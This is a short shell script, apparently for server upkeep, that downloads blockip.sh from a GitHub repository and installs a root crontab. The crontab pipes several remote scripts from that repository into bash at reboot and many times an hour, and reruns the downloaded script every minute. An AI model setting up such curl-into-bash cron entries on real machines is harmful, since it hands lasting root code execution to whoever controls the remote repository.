#!/bin/sh
sudo su
sudo rm /home/blockip.sh
sudo wget -P /home/ https://raw.githubusercontent.com/junscapital/reload/master/blockip.sh
echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/inreload.sh | bash
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/Do015.sh | bash
*/1 * * * * sudo bash /home/blockip.sh
50 1 * * 1,4 sudo rm /home/blockip.sh; sudo wget -P /home/ https://raw.githubusercontent.com/junscapital/reload/master/blockip.sh
 " >> myverifier
sudo crontab myverifier
rm myverifier
sudo supervisorctl reload
